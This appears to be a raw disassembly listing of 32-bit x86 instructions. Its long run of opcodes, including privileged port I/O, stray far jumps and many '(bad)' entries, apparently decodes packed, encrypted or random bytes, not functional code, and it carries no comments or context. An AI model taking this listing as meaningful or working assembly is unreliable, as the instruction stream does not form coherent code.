  4051f2:	test   eax,0x2991a2e3
  4051f7:	cmc    
  4051f8:	push   ss
  4051f9:	adc    DWORD PTR [ebp-0x1dd827f7],ebp
  4051ff:	push   es
  405200:	leave  
  405201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405203:	data16 jbe 0x405187
  405206:	stc    
  405207:	cwde   
  405208:	inc    edx
  405209:	stos   BYTE PTR es:[edi],al
  40520a:	ins    DWORD PTR es:[edi],dx
  40520b:	das    
  40520c:	mov    al,es:0x7a797d2e
  405212:	jle    0x405252
  405214:	mov    edx,0x3391f522
  405219:	out    dx,eax
  40521a:	dec    edi
  40521b:	sbb    ah,BYTE PTR [ebx+0x72]
  40521e:	jo     0x4051f4
  405220:	shl    BYTE PTR [edi-0x479e93fa],1
  405226:	call   0xf7ba:0xe90f7fcb
  40522d:	mov    eax,ds:0x55d9c4ba
  405232:	mov    WORD PTR [ecx-0x37978d1f],cs
  405238:	std    
  405239:	cmp    eax,0x7a2b352d
  40523e:	jp     0x4051cf
  405240:	jno    0x4051e9
  405242:	add    BYTE PTR [ebx+0x58],ah
  405245:	pop    ss
  405246:	sub    esp,DWORD PTR ds:0x303db1dc
  40524c:	sbb    ch,ah
  40524e:	fst    QWORD PTR [eax+0x61]
  405251:	enter  0x9a54,0x35
  405255:	adc    eax,0x38a1fdf4
  40525a:	cmp    BYTE PTR [ebp+0x2],dh
  40525d:	inc    esi
  40525e:	jb     0x4052c8
  405260:	jge    0x40520e
  405262:	icebp  
  405263:	jmp    0x4051f0
  405265:	mov    ebx,0x53142953
  40526a:	out    dx,al
  40526b:	out    dx,eax
  40526c:	and    bh,BYTE PTR [ebx]
  40526e:	bound  edi,QWORD PTR [edx+ebx*8-0x2adc956c]
  405275:	or     DWORD PTR [ebp+0x9],0x802e8485
  40527c:	hlt    
  40527d:	imul   ebx,DWORD PTR [esi],0x5c
  405280:	stc    
  405281:	shl    DWORD PTR [edx-0x6c],cl
  405284:	scas   eax,DWORD PTR es:[edi]
  405285:	outs   dx,BYTE PTR ds:[esi]
  405286:	add    dh,BYTE PTR [eax+0x40]
  405289:	jl     0x405281
  40528b:	inc    ebp
  40528c:	idiv   ebx
  40528e:	jmp    0xf196c820
  405293:	xor    BYTE PTR [edi*2+0x1f30b847],0x43
  40529b:	clc    
  40529c:	adc    eax,0xff576f6b
  4052a1:	or     DWORD PTR [edi],0xffffffdc
  4052a4:	leave  
  4052a5:	cld    
  4052a6:	xlat   BYTE PTR ds:[ebx]
  4052a7:	loope  0x40531e
  4052a9:	add    edx,DWORD PTR [eax-0x2663f544]
  4052af:	sar    DWORD PTR [eax-0x1ea50bd7],0x47
  4052b6:	ret    
  4052b7:	sbb    DWORD PTR [ebx-0x54],ecx
  4052ba:	mov    cl,0xb7
  4052bc:	das    
  4052bd:	jp     0x405321
  4052bf:	addr16 pusha 
  4052c1:	pop    ecx
  4052c2:	test   DWORD PTR [ebx],ecx
  4052c4:	xlat   BYTE PTR ds:[ebx]
  4052c5:	dec    eax
  4052c6:	ja     0x40533b
  4052c8:	mov    bh,0x31
  4052ca:	mov    ch,0xc3
  4052cc:	inc    sp
  4052ce:	jle    0x405292
  4052d0:	dec    eax
  4052d1:	inc    edx
  4052d2:	mov    ds:0x2ae068ad,eax
  4052d7:	call   0xe337f576
  4052dc:	mov    ah,0xa9
  4052de:	adc    al,0x94
  4052e0:	es ret 0x9687
  4052e4:	sbb    al,0xf4
  4052e6:	sar    BYTE PTR [eax+0x6f],0x52
  4052ea:	jae    0x40529a
  4052ec:	fld    TBYTE PTR [edx]
  4052ee:	std    
  4052ef:	push   esp
  4052f0:	dec    esp
  4052f1:	push   eax
  4052f2:	xchg   esi,eax
  4052f3:	mov    BYTE PTR [ecx],al
  4052f5:	xchg   edx,eax
  4052f6:	jo     0x1d096543
  4052fc:	push   edx
  4052fd:	mov    esp,cs
  4052ff:	idiv   BYTE PTR [edi+0x2b]
  405302:	scas   al,BYTE PTR es:[edi]
  405303:	sub    al,0x94
  405305:	outs   dx,BYTE PTR ds:[esi]
  405306:	mov    ah,dl
  405308:	retf   
  405309:	push   ebp
  40530a:	loope  0x4052e9
  40530c:	ror    BYTE PTR [edi+0xd],cl
  40530f:	cmp    DWORD PTR [edi+esi*1-0x37df1714],ebp
  405316:	mov    edx,0x593bd16f
  40531b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40531c:	fist   DWORD PTR [esi+0x39]
  40531f:	inc    esp
  405320:	xchg   ecx,eax
  405321:	sbb    bh,BYTE PTR [ebx]
  405323:	ja     0x4052c6
  405325:	pushf  
  405326:	call   0xb550c5b6
  40532b:	leave  
  40532c:	loopne 0x405300
  40532e:	pop    edx
  40532f:	repnz inc ecx
  405331:	mov    ecx,0x5193e2e0
  405336:	bound  ebp,QWORD PTR [ebx-0x6f]
  405339:	add    DWORD PTR [edx],ebx
  40533b:	rcl    DWORD PTR [ecx-0x2e],1
  40533e:	fisttp WORD PTR ds:0x86cf9d62
  405344:	cdq    
  405345:	jmp    edi
  405347:	jp     0x405387
  405349:	cmc    
  40534a:	test   edx,edi
  40534c:	xor    al,0x87
  40534e:	in     al,0xee
  405350:	xor    edx,eax
  405352:	or     esp,DWORD PTR [edi-0x66]
  405355:	in     al,0x38
  405357:	in     al,0x25
  405359:	out    dx,eax
  40535a:	dec    edi
  40535b:	cmp    DWORD PTR [eax+0x51],esp
  40535e:	xor    al,0xd2
  405360:	scas   al,BYTE PTR es:[edi]
  405361:	icebp  
  405362:	pop    ss
  405363:	in     eax,0xcf
  405365:	inc    ecx
  405366:	inc    edx
  405367:	dec    eax
  405368:	jnp    0x40535a
  40536a:	int3   
  40536b:	push   esp
  40536c:	or     eax,0xe6761605
  405371:	out    dx,al
  405372:	xchg   esi,eax
  405373:	test   eax,0x1aad5c29
  405378:	ret    0x2a1b
  40537b:	dec    ebp
  40537c:	or     eax,0x8d2c5921
  405381:	cmp    eax,0x18ddfbcd
  405386:	stos   BYTE PTR es:[edi],al
  405387:	inc    ecx
  405388:	pop    ecx
  405389:	in     al,dx
  40538a:	cmp    BYTE PTR [edi+0x58],0x83
  40538e:	mov    al,ds:0x245d4136
  405393:	adc    eax,0x16684dce
  405398:	and    eax,0x72a0c2e9
  40539d:	push   esi
  40539e:	dec    ecx
  40539f:	pop    ecx
  4053a0:	mov    edx,eax
  4053a2:	cmc    
  4053a3:	jg     0x4053f2
  4053a5:	and    al,0x69
  4053a7:	gs out 0xcb,eax
  4053aa:	std    
  4053ab:	(bad)  
  4053ac:	ins    WORD PTR es:[edi],dx
  4053ae:	dec    edx
  4053af:	aas    
  4053b0:	dec    edi
  4053b1:	dec    esp
  4053b2:	fs push 0x7d
  4053b5:	cmp    eax,0xe8983709
  4053ba:	and    edx,0x173b6d6a
  4053c0:	or     al,0xf1
  4053c2:	push   edx
  4053c3:	mov    al,0xc
  4053c5:	and    ch,BYTE PTR [ecx+ecx*4]
  4053c8:	sbb    eax,0x9453b479
  4053cd:	imul   eax,DWORD PTR [edx+0x15],0xb9b85010
  4053d4:	cdq    
  4053d5:	outs   dx,BYTE PTR ds:[esi]
  4053d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053d7:	fidivr WORD PTR [ebx+0xc94019b]
  4053dd:	retf   0xd9bd
  4053e0:	ss and edi,0x87bbd2a3
  4053e7:	hlt    
  4053e8:	adc    ebp,ebx
  4053ea:	hlt    
  4053eb:	xchg   ecx,eax
  4053ec:	int    0xb6
  4053ee:	add    eax,0x614093ef
  4053f3:	dec    edi
  4053f4:	mov    ch,0x13
  4053f6:	mov    ss,WORD PTR [ebp-0x2ffc4f3c]
  4053fc:	add    al,0x9d
  4053fe:	fmul   QWORD PTR [edi-0x534796f]
  405404:	js     0x405452
  405406:	cmp    BYTE PTR [eax+0x6c],ah
  405409:	push   ss
  40540a:	cwde   
  40540b:	cmp    dh,BYTE PTR [edi]
  40540d:	cs aaa 
  40540f:	fucomip st,st(2)
  405411:	sbb    BYTE PTR [eax+0x31781082],0xb1
  405418:	mov    dl,0xda
  40541a:	mov    esp,DWORD PTR [edx]
  40541c:	dec    edx
  40541d:	mov    dl,0x46
  40541f:	jmp    0xef9192c6
  405424:	mov    eax,ds:0x75036ed7
  405429:	(bad)  
  40542a:	call   DWORD PTR [esi]
  40542c:	(bad)  
  40542d:	out    0x8c,eax
  40542f:	or     BYTE PTR [ebx-0x6864fbe4],dh
  405435:	imul   eax,edx,0xe216785d
  40543b:	push   ds
  40543c:	dec    eax
  40543d:	mov    ah,0xc5
  40543f:	mov    al,ds:0x77c82622
  405444:	mov    ds:0xdc92934e,eax
  405449:	fwait
  40544a:	inc    ebp
  40544b:	(bad)  
  40544d:	in     al,dx
  40544e:	mov    ecx,0x59095c08
  405453:	pop    ebp
  405454:	popa   
  405455:	mov    ch,0x3b
  405457:	das    
  405458:	jno    0x40540a
  40545a:	retf   
  40545b:	jl     0x405471
  40545d:	and    ch,BYTE PTR [edi+0x4f]
  405460:	lahf   
  405461:	in     eax,dx
  405462:	inc    eax
  405463:	arpl   dx,bx
  405465:	leave  
  405466:	and    al,0x39
  405468:	mov    bl,0xf7
  40546a:	xchg   esp,eax
  40546b:	jle    0x4053ed
  40546d:	icebp  
  40546e:	jmp    FWORD PTR [esi+0x4b27c69b]
  405474:	and    edi,DWORD PTR [ecx+0x39]
  405477:	and    BYTE PTR [edx-0x8416544],0x11
  40547e:	adc    eax,0x3c8cca99
  405483:	adc    BYTE PTR ds:0xe58cde3d,0xa4
  40548a:	adc    al,0x4
  40548c:	cmp    BYTE PTR ds:[ebp+0x7a2d1ce0],ch
  405493:	pop    ecx
  405494:	jno    0x4054e8
  405496:	retf   
  405497:	and    edi,DWORD PTR [esi-0x4c6865ed]
  40549d:	out    dx,eax
  40549e:	icebp  
  40549f:	stos   BYTE PTR es:[edi],al
  4054a0:	out    0x29,eax
  4054a2:	mov    gs,WORD PTR [edx]
  4054a4:	or     BYTE PTR [ebx],bh
  4054a6:	pop    edi
  4054a7:	(bad)  
  4054a8:	js     0x4054e8
  4054aa:	rol    BYTE PTR [ecx-0x4c421a5e],0xe2
  4054b1:	aas    
  4054b2:	aad    0x1a
  4054b4:	jg     0x4054bf
  4054b6:	or     eax,0x9a0734d9
  4054bb:	xor    eax,0x7f11f686
  4054c0:	ret    0x5ada
  4054c3:	call   0x3447:0x17c72d14
  4054ca:	push   0xfe099bd4
  4054cf:	jne    0x40545c
  4054d1:	push   ebp
  4054d2:	pusha  
  4054d3:	in     al,0x1c
  4054d5:	shl    BYTE PTR ds:[eax+0x7d],cl
  4054d9:	pop    ds
  4054da:	sar    edx,0xa8
  4054dd:	adc    eax,0x6b535ae1
  4054e2:	jne    0x4054d2
  4054e4:	or     al,0x17
  4054e6:	cwde   
  4054e7:	jae    0x405538
  4054e9:	jmp    DWORD PTR [ecx-0x4e1a85cb]
  4054ef:	sbb    eax,0x74218c3e
  4054f4:	xor    eax,0x56a822dd
  4054f9:	inc    esp
  4054fa:	pop    ecx
  4054fb:	mov    esi,0xe582c75f
  405500:	mov    ch,0x34
  405502:	test   eax,0xbab2b4d3
  405507:	ror    DWORD PTR [edx],cl
  405509:	test   esp,esp
  40550b:	mov    cl,ch
  40550d:	loopne 0x40549e
  40550f:	pop    ebx
  405510:	mov    eax,0x20ec0f2b
  405515:	mov    eax,ds:0xab6bad9f
  40551a:	out    0x44,al
  40551c:	xchg   ebx,eax
  40551d:	cld    
  40551e:	push   ds
  40551f:	adc    al,0xd3
  405521:	mul    DWORD PTR [eax+0x50]
  405524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405525:	xlat   BYTE PTR ds:[ebx]
  405526:	xor    esp,edi
  405528:	push   ss
  405529:	idiv   DWORD PTR [esi+0x69]
  40552c:	push   es
  40552d:	fbstp  TBYTE PTR [ecx+eiz*1+0x16]
  405531:	lds    ebp,FWORD PTR [esp+edx*1-0x4630080d]
  405538:	jmp    0xcdf2:0x6d4ee3b2
  40553f:	enter  0x2619,0x9d
  405543:	push   esp
  405544:	mov    esi,0x826f05ae
  405549:	xor    al,0x14
  40554b:	outs   dx,BYTE PTR ds:[esi]
  40554c:	pushf  
  40554d:	and    al,0x6a
  40554f:	ds scas eax,DWORD PTR es:[edi]
  405551:	popa   
  405552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405553:	xchg   esp,eax
  405554:	mov    bl,0xdf
  405556:	and    eax,0xfd65a7c2
  40555b:	add    BYTE PTR [eax-0x7dd6f613],0xf6
  405562:	mov    edi,0x770e1a8e
  405567:	aas    
  405568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405569:	mov    edx,0x3609b649
  40556e:	dec    esp
  40556f:	daa    
  405570:	cmc    
  405571:	mov    ds:0xd107f105,eax
  405576:	sbb    al,BYTE PTR [esi-0x42]
  405579:	mov    al,0x78
  40557b:	in     eax,dx
  40557c:	test   eax,0x95724242
  405581:	data16 mov bl,0x90
  405584:	arpl   WORD PTR [edi],si
  405586:	fdivr  DWORD PTR [eax+0x8]
  405589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40558a:	gs inc ebx
  40558c:	adc    edi,DWORD PTR [ebx+ebp*4+0xd1c99e6]
  405593:	sub    bl,BYTE PTR [edx+0x9f8876e]
  405599:	loop   0x40559e
  40559b:	scas   al,BYTE PTR es:[edi]
  40559c:	clc    
  40559d:	mov    cl,0x59
  40559f:	lods   eax,DWORD PTR ds:[esi]
  4055a0:	xor    dl,BYTE PTR [ecx+0x32171613]
  4055a6:	dec    ecx
  4055a7:	call   0xb7be:0xf12a2671
  4055ae:	pop    edi
  4055af:	xor    eax,0xdf99c8ab
  4055b4:	cmc    
  4055b5:	stos   BYTE PTR es:[edi],al
  4055b6:	xchg   DWORD PTR [edx-0x1b4a6b5d],ecx
  4055bc:	repnz fst DWORD PTR [esi]
  4055bf:	fld    QWORD PTR [esi]
  4055c1:	add    edi,DWORD PTR fs:[ebp+0x39]
  4055c5:	cmp    ebp,DWORD PTR ds:0x2ff9c5f0
  4055cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055cc:	hlt    
  4055cd:	adc    bl,BYTE PTR [ebp+0x42]
  4055d0:	pop    ds
  4055d1:	loopne 0x4055ec
  4055d3:	cdq    
  4055d4:	shr    al,1
  4055d6:	push   ds
  4055d7:	mov    edi,0x5e9a9693
  4055dc:	cld    
  4055dd:	jb     0x40564b
  4055df:	(bad)  
  4055e0:	and    DWORD PTR [ebp-0x7ad4a560],esi
  4055e6:	gs mov esp,0x40242af4
  4055ec:	cdq    
  4055ed:	cmp    ch,bh
  4055ef:	dec    ebx
  4055f0:	pavgw  mm5,QWORD PTR [ebx*1-0x3f86852c]
  4055f8:	sub    eax,0x238eb67
  4055fd:	fld    TBYTE PTR [ebx-0x196f6618]
  405603:	pop    ss
  405604:	dec    esp
  405605:	dec    ecx
  405606:	jb     0x405644
  405608:	hlt    
  405609:	add    ebx,eax
  40560b:	fnsave [eax-0x68]
  40560e:	in     al,0xdb
  405610:	leave  
  405611:	mov    dh,0xff
  405613:	inc    ebp
  405614:	pop    es
  405615:	xor    al,0x5c
  405617:	clc    
  405618:	and    BYTE PTR [edi-0x520d77cc],0xcd
  40561f:	push   0x9f50c9c3
  405624:	mov    dl,0xb6
  405626:	pop    esp
  405627:	ja     0x40567d
  405629:	jmp    0xe14d:0xbcef82df
  405630:	push   ecx
  405631:	xor    cl,dh
  405633:	sub    DWORD PTR [edi+eax*1+0x1b],ecx
  405637:	stos   BYTE PTR es:[edi],al
  405638:	pop    ebx
  405639:	mov    edx,ecx
  40563b:	fcom   st(3)
  40563d:	sub    al,0xb8
  40563f:	aam    0xc3
  405641:	cmp    DWORD PTR [ebx+0x57180bbe],esp
  405647:	push   0xbf7af827
  40564c:	in     al,0x2a
  40564e:	mov    ds:0xdce4ab3f,al
  405653:	cld    
  405654:	inc    edx
  405655:	and    eax,0x65cb4fd
  40565a:	pop    ecx
  40565b:	fcomp  DWORD PTR [ebp+0x27843b4c]
  405661:	dec    ebx
  405662:	jge    0x4055ee
  405664:	adc    al,0x14
  405666:	and    bh,BYTE PTR [esi]
  405668:	mov    esi,0xb96b55ce
  40566d:	sti    
  40566e:	popf   
  40566f:	sub    eax,0x8e26010b
  405674:	mov    DWORD PTR [esp+eax*1+0x638ac99a],ecx
  40567b:	push   ebp
  40567c:	push   eax
  40567d:	push   edi
  40567e:	pop    edx
  40567f:	and    al,0x34
  405681:	stos   DWORD PTR es:[edi],eax
  405682:	ins    DWORD PTR es:[edi],dx
  405683:	loope  0x405626
  405685:	push   edi
  405686:	mov    edx,0x972dd279
  40568b:	dec    edx
  40568c:	ins    DWORD PTR es:[edi],dx
  40568d:	int3   
  40568e:	out    0xb3,al
  405690:	push   ebp
  405691:	das    
  405692:	div    dh
  405694:	(bad)  
  405696:	dec    ebp
  405697:	add    eax,0x1aba7c7b
  40569c:	pop    ecx
  40569d:	(bad)  
  40569e:	imul   edi,DWORD PTR [edi],0x23a9ede
  4056a4:	mov    ds:0x29a1cdf4,eax
  4056a9:	test   eax,0x274122fa
  4056ae:	sub    al,0xd6
  4056b0:	call   0x804cc810
  4056b5:	scas   al,BYTE PTR es:[edi]
  4056b6:	aam    0xf5
  4056b8:	aaa    
  4056b9:	icebp  
  4056ba:	jmp    0x226b:0x9b5e9288
  4056c1:	mov    ds:0xc2671c01,al
  4056c6:	xchg   edi,eax
  4056c7:	mov    esp,DWORD PTR [esi+0x69820923]
  4056cd:	lods   al,BYTE PTR ds:[esi]
  4056ce:	and    DWORD PTR [esi+0x37],edi
  4056d1:	sub    esp,edx
  4056d3:	inc    ecx
  4056d4:	fwait
  4056d5:	pop    edx
  4056d6:	sub    al,0x2
  4056d8:	pushf  
  4056d9:	inc    ebp
  4056da:	fs jb  0x405718
  4056dd:	add    al,0x94
  4056df:	push   0x412a1946
  4056e4:	fucomp st(6)
  4056e6:	gs jb  0x405720
  4056e9:	cmp    al,0x5e
  4056eb:	ja     0x4056b5
  4056ed:	pop    ss
  4056ee:	add    al,0x22
  4056f0:	aad    0x79
  4056f2:	lahf   
  4056f3:	pop    ebx
  4056f4:	fidivr WORD PTR [ebx-0x5cfb519]
  4056fa:	int    0x96
  4056fc:	test   BYTE PTR [esi+0x7d],ch
  4056ff:	stos   BYTE PTR es:[edi],al
  405700:	stos   DWORD PTR es:[edi],eax
  405701:	stos   BYTE PTR es:[edi],al
  405702:	add    cl,ch
  405704:	imul   ecx,DWORD PTR [ebp+0x4a],0x863782b5
  40570b:	sbb    bl,bl
  40570d:	push   esi
  40570e:	lahf   
  40570f:	ds jge 0x40576c
  405712:	or     BYTE PTR [esp+eax*4-0x72],cl
  405716:	push   edx
  405717:	sahf   
  405718:	sub    bl,dl
  40571a:	cli    
  40571b:	jmp    0x7f98597
  405720:	int    0x4a
  405722:	xor    eax,DWORD PTR [eax]
  405724:	sbb    BYTE PTR [ebx+0x21],0x56
  405728:	adc    dl,BYTE PTR [ebp+0x4b2f87c7]
  40572e:	ins    BYTE PTR es:[edi],dx
  40572f:	or     al,0x91
  405731:	add    dl,BYTE PTR [ebx]
  405733:	xor    BYTE PTR [edi],dl
  405735:	dec    ecx
  405736:	(bad)  
  405737:	addr16 call 0x61d59927
  40573d:	and    DWORD PTR [eax+0x7b],ebp
  405740:	jbe    0x4056e9
  405742:	add    al,0xd
  405744:	lock mov dl,0x9e
  405747:	sbb    ebx,DWORD PTR [eax+0x39c32d51]
  40574d:	sub    eax,0x5360120a
  405752:	fs or  ebx,edi
  405755:	mov    esp,0xd6358463
  40575a:	and    WORD PTR [edx-0x6825aa1f],cx
  405761:	mov    edi,0x2f151352
  405766:	in     al,0x64
  405768:	pop    es
  405769:	imul   ecx,DWORD PTR cs:[di-0x877],0x61
  405770:	jno    0x4057e5
  405772:	cmp    al,BYTE PTR es:[esi-0x3784a9bb]
  405779:	adc    ebx,esp
  40577b:	inc    ecx
  40577c:	push   0xffffffd5
  40577e:	shl    BYTE PTR [edi+0x7efcd5c],cl
  405784:	push   es
  405785:	fwait
  405786:	call   0xa4d0:0xee9c7b04
  40578d:	inc    esi
  40578e:	or     al,0x86
  405790:	jb     0x40572b
  405792:	shl    BYTE PTR [ebx-0x364d2ad4],1
  405798:	dec    edx
  405799:	push   esp
  40579a:	cmp    dh,BYTE PTR [esi]
  40579c:	rcpps  xmm6,XMMWORD PTR [ebx-0x2aae7bc2]
  4057a3:	scas   al,BYTE PTR es:[edi]
  4057a4:	int    0x0
  4057a6:	pusha  
  4057a7:	out    0xa5,eax
  4057a9:	inc    eax
  4057aa:	retf   
  4057ab:	loop   0x405789
  4057ad:	ret    
  4057ae:	scas   al,BYTE PTR es:[edi]
  4057af:	or     DWORD PTR [edx],esi
  4057b1:	nop
  4057b2:	cmp    eax,0x83c9adea
  4057b7:	lahf   
  4057b8:	push   esp
  4057b9:	ret    
  4057ba:	das    
  4057bb:	adc    al,0x4d
  4057bd:	push   edi
  4057be:	fstp   DWORD PTR [eax+0x787cdcfb]
  4057c4:	loop   0x40577b
  4057c6:	jg     0x4057bb
  4057c8:	popa   
  4057c9:	int3   
  4057ca:	sub    al,0xb0
  4057cc:	sub    ebp,DWORD PTR es:[ebx+edx*8+0x58]
  4057d1:	xor    BYTE PTR [esi],dh
  4057d3:	fwait
  4057d4:	push   ebp
  4057d5:	imul   DWORD PTR [ebx]
  4057d7:	addr16 mov eax,ds:0x5087
  4057db:	outs   dx,BYTE PTR ds:[esi]
  4057dc:	and    al,0xc
  4057de:	jno    0x405772
  4057e0:	pop    esi
  4057e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057e2:	test   dl,dl
  4057e4:	sub    eax,0x735d19b5
  4057ea:	push   edx
  4057eb:	dec    ebp
  4057ec:	sahf   
  4057ed:	sbb    eax,0x60438757
  4057f2:	int3   
  4057f3:	data16 vpunpckhqdq xmm6,xmm1,XMMWORD PTR [ebp-0x6783b60b]
  4057fc:	stos   DWORD PTR es:[edi],eax
  4057fd:	stc    
  4057fe:	enter  0x2528,0xb6
  405802:	arpl   cx,cx
  405804:	jecxz  0x405828
  405806:	shr    BYTE PTR [ebx+0x48],1
  405809:	add    DWORD PTR [ebx+esi*8-0xf],edi
  40580d:	inc    ebx
  40580e:	cld    
  40580f:	pop    ss
  405810:	icebp  
  405811:	sub    DWORD PTR es:[ebx-0x7acdc2aa],ebp
  405818:	mov    es,WORD PTR [ecx+0x78]
  40581b:	imul   ecx,DWORD PTR [ebx-0x66bfbdc5],0xffffffb5
  405822:	xchg   ecx,eax
  405823:	sub    DWORD PTR [ebx+0x28e791d9],eax
  405829:	not    DWORD PTR [esi-0x80]
  40582c:	jno    0x4057c5
  40582e:	mov    al,0xc0
  405830:	pop    ecx
  405831:	dec    edx
  405832:	dec    edx
  405833:	sar    BYTE PTR [edi],cl
  405835:	std    
  405836:	pop    ds
  405837:	and    BYTE PTR [eax-0x2],ah
  40583a:	mov    ah,0x64
  40583c:	dec    edi
  40583d:	fwait
  40583e:	inc    eax
  40583f:	ror    DWORD PTR [bx-0x4f21],0x1e
  405845:	bound  eax,QWORD PTR [edi+0x57]
  405848:	jge    0x40588f
  40584a:	pop    ds
  40584b:	pop    ebx
  40584c:	loope  0x40581e
  40584e:	enter  0x4ff7,0xf0
  405852:	add    DWORD PTR [eax-0x11],ecx
  405855:	ja     0x405877
  405857:	pop    esi
  405858:	aad    0x2f
  40585a:	xchg   edi,eax
  40585b:	cli    
  40585c:	inc    esp
  40585d:	loopne 0x40585f
  40585f:	popf   
  405860:	cmp    bl,BYTE PTR [ecx-0x4a]
  405863:	push   edi
  405864:	call   FWORD PTR [esi]
  405866:	pop    edi
  405867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405868:	inc    esp
  405869:	cmp    al,0xfd
  40586b:	jns    0x4058ad
  40586d:	and    BYTE PTR [ecx+0x3b],0x16
  405871:	je     0x405860
  405873:	popf   
  405874:	sub    al,0xf6
  405876:	and    ebx,edi
  405878:	and    ebp,DWORD PTR [esi]
  40587a:	cwde   
  40587b:	adc    ecx,ebx
  40587d:	adc    al,0x87
  40587f:	jns    0x4058be
  405881:	int3   
  405882:	test   BYTE PTR [ecx],dl
  405884:	mov    ebp,0x9c7b523d
  405889:	and    al,0x9f
  40588b:	loope  0x4058f0
  40588d:	sbb    eax,0x2eb431f0
  405892:	mov    edx,0xa80a0c0d
  405897:	adc    DWORD PTR ds:0xb79e60d0,esp
  40589d:	xor    cl,0xf9
  4058a0:	push   edx
  4058a1:	jge    0xadf29e6d
  4058a7:	sti    
  4058a8:	jo     0x405899
  4058aa:	cmp    ebp,DWORD PTR [esi+eax*1+0xd7d6939]
  4058b1:	adc    bh,BYTE PTR [esp+ebx*1-0x6a]
  4058b5:	cs jbe 0x40591b
  4058b8:	ins    DWORD PTR es:[edi],dx
  4058b9:	adc    ch,BYTE PTR [ecx+0x3a]
  4058bc:	aam    0xc7
  4058be:	in     eax,0x49
  4058c0:	cld    
  4058c1:	in     eax,dx
  4058c2:	xchg   DWORD PTR [ecx-0x5a],esi
  4058c5:	sbb    al,0xb4
  4058c7:	xchg   ecx,eax
  4058c8:	pop    ebp
  4058c9:	icebp  
  4058ca:	sar    BYTE PTR [ebx+0x6],0x46
  4058ce:	xchg   edi,eax
  4058cf:	imul   esi,DWORD PTR [ebx+0x45],0x8dcb035a
  4058d6:	in     eax,dx
  4058d7:	xor    cl,0x4
  4058da:	inc    esp
  4058db:	adc    BYTE PTR [ecx+0x2a5cefa5],ch
  4058e1:	adc    bh,BYTE PTR [esi-0x61]
  4058e4:	in     al,0xe1
  4058e6:	outs   dx,BYTE PTR ds:[esi]
  4058e7:	xchg   edx,eax
  4058e8:	push   ds
  4058e9:	(bad)  
  4058ea:	jecxz  0x40592f
  4058ec:	mov    ebp,0xbb0cd5c
  4058f1:	xchg   BYTE PTR ds:0xeb49ab29,cl
  4058f7:	cmp    BYTE PTR [esi-0x45cd8781],ah
  4058fd:	(bad)  
  4058fe:	ja     0x405963
  405900:	inc    esi
  405901:	shr    BYTE PTR [edx-0x20],1
  405904:	cld    
  405905:	inc    esi
  405906:	retf   0xdaa5
  405909:	hlt    
  40590a:	hlt    
  40590b:	push   ebp
  40590c:	les    ecx,FWORD PTR [esi]
  40590e:	retf   0x410c
  405911:	(bad)  
  405912:	loope  0x405973
  405914:	lahf   
  405915:	push   ds
  405916:	cmp    BYTE PTR [esi],ch
  405918:	sti    
  405919:	stos   BYTE PTR es:[edi],al
  40591a:	gs jecxz 0x40598a
  40591d:	mov    dh,0x1d
  40591f:	cmc    
  405920:	shl    DWORD PTR [eax+0x74],cl
  405923:	mov    ds:0x18fdd904,eax
  405928:	mov    ebp,0xad34786a
  40592d:	outs   dx,DWORD PTR ds:[esi]
  40592e:	dec    esi
  40592f:	in     eax,0xa5
  405931:	ror    BYTE PTR [eax-0x40],1
  405934:	push   ds
  405935:	out    dx,eax
  405936:	push   esp
  405937:	mov    ds,WORD PTR [ecx]
  405939:	fstp   TBYTE PTR [ebx-0x2ca82224]
  40593f:	xchg   edx,eax
  405940:	into   
  405941:	shl    DWORD PTR [ebx-0x2f],1
  405944:	inc    edi
  405945:	adc    dl,BYTE PTR [eax]
  405947:	inc    BYTE PTR [ecx+0x215f28ad]
  40594d:	stos   BYTE PTR es:[edi],al
  40594e:	sub    DWORD PTR [ebx],edi
  405950:	and    bl,bl
  405952:	shl    bh,cl
  405954:	das    
  405955:	ret    
  405956:	adc    esp,ecx
  405958:	(bad)  
  40595a:	push   0x566102a0
  40595f:	outs   dx,BYTE PTR ds:[esi]
  405960:	rcr    BYTE PTR [eax],1
  405962:	push   ebx
  405963:	bound  eax,QWORD PTR [esi]
  405965:	(bad)  [edx+0x31]
  405968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405969:	mov    ecx,0x9fdd1205
  40596e:	mov    BYTE PTR [ecx*2+0x3977d4fd],dh
  405975:	lods   al,BYTE PTR ds:[esi]
  405976:	cmovnp ecx,DWORD PTR [ecx]
  405979:	pop    ds
  40597a:	jns    0x40591f
  40597c:	xor    al,0x6d
  40597e:	add    eax,eax
  405980:	(bad)  
  405981:	imul   ebx,DWORD PTR [ebx],0xffffffb6
  405984:	(bad)  
  405985:	aaa    
  405986:	mov    eax,0x112e6d5d
  40598b:	jns    0x40597f
  40598d:	xlat   BYTE PTR ds:[ebx]
  40598e:	push   ebx
  40598f:	sbb    edx,esp
  405991:	arpl   ax,dx
  405993:	or     DWORD PTR [ebx],eax
  405995:	out    dx,al
  405996:	in     al,dx
  405997:	push   ebp
  405998:	xor    eax,DWORD PTR [edi+0x42]
  40599b:	pop    ebx
  40599c:	cmp    eax,0xd34f29c5
  4059a1:	mov    ds:0xe1e72eb9,eax
  4059a6:	pushf  
  4059a7:	dec    esi
  4059a8:	cmp    ch,BYTE PTR [ebx]
  4059aa:	pop    ds
  4059ab:	and    al,0x7
  4059ad:	jl     0x405a04
  4059af:	inc    eax
  4059b0:	std    
  4059b1:	sti    
  4059b2:	push   ecx
  4059b3:	(bad)  
  4059b4:	(bad)  
  4059b5:	adc    BYTE PTR [ebx],0xba
  4059b8:	sbb    BYTE PTR [ebx+0x48507104],ah
  4059be:	aam    0xf4
  4059c0:	outs   dx,DWORD PTR ds:[esi]
  4059c1:	dec    edi
  4059c2:	ficom  DWORD PTR [ebx-0x59]
  4059c5:	cmc    
  4059c6:	(bad)  
  4059c7:	cmp    esi,DWORD PTR [ebx+0x2d32c06a]
  4059cd:	sub    DWORD PTR [edx+0x21c2189d],edx
  4059d3:	ret    0x7cf4
